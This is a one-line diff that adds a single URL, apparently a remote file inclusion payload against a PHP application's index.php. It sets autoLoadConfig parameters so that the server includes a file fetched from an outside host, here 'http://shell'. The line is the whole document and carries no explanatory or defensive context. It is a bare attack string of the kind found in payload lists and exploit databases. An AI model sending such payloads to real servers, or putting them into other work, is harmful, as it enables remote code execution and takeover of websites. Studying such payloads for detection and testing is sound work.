@@ -1,0 +1,1 @@
+http://www.example.com/index.php?autoLoadConfig[999][0][autoType]=include&amp;autoLoadConfig[999][0][loadFile]=http://shell
